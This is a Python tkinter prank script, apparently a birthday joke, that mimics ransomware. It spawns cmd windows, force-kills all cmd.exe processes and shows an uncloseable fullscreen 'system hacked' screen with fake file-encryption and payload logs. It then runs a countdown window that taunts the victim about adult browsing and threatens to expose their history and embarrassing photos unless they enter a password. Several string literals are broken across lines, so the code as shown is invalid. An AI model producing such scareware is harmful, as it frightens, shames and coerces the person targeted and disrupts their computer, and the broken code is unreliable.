import tkinter as tk
from tkinter import messagebox, ttk
import time
import threading
import os
import subprocess

# Настоящий пароль для разблокировки
CORRECT_PASSWORD = '5V8Zmmj_s6d"VJt_D'

def start_cmd_spam():
    processes = []
    # Открываем несколько консолей для "хакерского" эффекта
    for _ in range(6):
        p = subprocess.Popen('start cmd /k "color 0a & dir /s C:\\"', shell=True)
        processes.append(p)
    
    time.sleep(8)
    # Закрываем спам-консоли перед выводом блокировщика
    os.system("taskkill /f /im cmd.exe")
    show_fullscreen_lock()

def show_fullscreen_lock():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.configure(background='black')
    
    # Блокируем закрытие окна по крестику / Alt+F4
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    
    lbl_main = tk.Label(root, text="СИСТЕМА ВЗЛОМАНА", font=("Consolas", 28, "bold"), fg="#00FF00", bg="black")
    lbl_main.pack(pady=30)

    log_text = tk.Label(root, text="", font=("Consolas", 14), fg="#00FF00", bg="black", justify="left")
    log_text.pack(pady=10)

    style = ttk.Style()
    style.theme_use('default')
    style.configure("green.Horizontal.TProgressbar", background='#00FF00', thickness=30)
    
    progress = ttk.Progressbar(root, length=600, mode='determinate', style="green.Horizontal.TProgressbar")
    progress.pack(pady=20)

    status_lbl = tk.Label(root, text="", font=("Consolas", 16, "bold"), fg="white", bg="black")
    status_lbl.pack(pady=10)

    texts = [
        "1. Идет взлом ПК...",
        "2. Загрузка данных...",
        "3. Прочищаем твою историю браузера...",
        "4. Нашли в истории браузера 18+ сайты, фу какой ты убогий...",
        "5. Еще чуть чуть...",
        "6. Че сидишь помогай, сделай вид что на кнопочки тыкаешь",
        "7. Че 16 лет тебе исполнилось, а ты даже не можешь на кнопки тыкнуть?",
        "8. Ура осталось совсем немного...",
        "9. Ой, не то погоди чуть чуть, сфотаю тебя...",
        "10. Боже, Ты не включил камеру? Ну и иди на все 4 стороны!",
        "11. Загрузка завершена!"
    ]

    def run_progress():
        step_time = 35 / len(texts)
        for i, t in enumerate(texts):
            status_lbl.config(text=t)
            log_text.config(text=f"[LOG]: Executing module_{i+1}...
[SYS]: Encrypting user files...
[NET]: Sending payload...")
            progress['value'] = (i + 1) * (100 / len(texts))
            root.update()
            time.sleep(step_time)
        
        root.destroy()
        show_timer_window()

    threading.Thread(target=run_progress, daemon=True).start()
    root.mainloop()

def show_timer_window():
    window = tk.Tk()
    window.title("ВНИМАНИЕ! СИСТЕМА ЗАБЛОКИРОВАНА")
    window.geometry("620x520")
    window.attributes('-topmost', True)
    window.protocol("WM_DELETE_WINDOW", lambda: None)
    
    time_left = [2400] # 40 минут (2400 секунд)

    lbl_warn = tk.Label(window, text="⚠️ ВНИМАНИЕ! ⚠️", font=("Arial", 18, "bold"), fg="red")
    lbl_warn.pack(pady=10)

    msg = ("Выключение Устройства принудительно или закрытие данного окна с таймером,
"
           "влечет выложение вашей истории браузера, или того что почти весь класс увидит вашу жопу. Хахахахахаха.

"
           "Ладно, чтобы снять эту фигню тебе надо ввести пароль в окошко ниже.")
    
    lbl_msg = tk.Label(window, text=msg, font=("Arial", 10), wraplength=550, justify="center")
    lbl_msg.pack(pady=10)

    timer_lbl = tk.Label(window, text="40:00", font=("Consolas", 32, "bold"), fg="red")
    timer_lbl.pack(pady=10)

    entry = tk.Entry(window, font=("Arial", 14), width=25)
    entry.pack(pady=10)

    def check_pass():
        if entry.get() == CORRECT_PASSWORD:
            messagebox.showinfo("Ура!", "С ДНЕМ РОЖДЕНИЯ, АРТЕМ! 🥳\nСистема разблокирована, это был прикол!")
            window.destroy()
        else:
            messagebox.showerror("Ошибка", "Неверный пароль! Ищи расшифровку в текстовом файле!")

    btn = tk.Button(window, text="Разблокировать", command=check_pass, bg="green", fg="white", font=("Arial", 12, "bold"))
    btn.pack(pady=10)

    lbl_footer = tk.Label(window, text="Напиши мне для получения пароля, и я оставлю тебя в покое.", font=("Arial", 9, "italic"))
    lbl_footer.pack(side="bottom", pady=15)

    def update_timer():
        if time_left[0] > 0:
            time_left[0] -= 1
            mins, secs = divmod(time_left[0], 60)
            timer_lbl.config(text=f"{mins:02d}:{secs:02d}")
            window.after(1000, update_timer)
        else:
            timer_lbl.config(text="ВРЕМЯ ИСТЕКЛО!")

    update_timer()
    window.mainloop()

if __name__ == "__main__":
    start_cmd_spam()
